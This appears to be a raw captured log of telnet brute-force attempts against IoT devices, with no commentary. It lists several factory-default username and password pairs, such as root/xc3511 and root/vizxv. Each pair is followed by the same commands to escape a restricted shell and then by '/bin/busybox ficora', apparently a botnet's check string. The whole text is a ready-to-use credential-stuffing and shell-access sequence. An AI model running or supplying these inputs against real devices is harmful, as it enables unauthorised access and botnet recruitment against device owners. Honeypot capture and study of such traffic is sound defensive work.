yhtcadmin

cm1@yhfw
enable
system
shell
sh
/bin/busybox ficora
root

xc3511
enable
system
shell
sh
/bin/busybox ficora
e8telnet

e8telnet
enable
system
shell
sh
/bin/busybox ficora
root

hi3518
enable
system
shell
sh
/bin/busybox ficora
yhtcadmin

cm1@yhfw
enable
system
shell
sh
/bin/busybox ficora
root

vizxv
enable
system
shell
sh
/bin/busybox ficora
admin

vnt3ch@dm1n
enable
system
shell
sh
/bin/busybox ficora
root

default
enable
system
shell
sh
/bin/busybox ficora
root

svgodie
enable
system
shell
sh
/bin/busybox ficora
root

123456
enable
system
shell
sh
/bin/busybox ficora
root

1111111
enable
system
shell
sh
/bin/busybox ficora
admin

ttcn@77cn
enable
system
shell
sh
/bin/busybox ficora
admin

1234
enable
system
shell
sh
/bin/busybox ficora
admin

qwerty
enable
system
shell
sh
/bin/busybox ficora
admin

meinsm
enable
system
shell
sh
/bin/busybox ficora
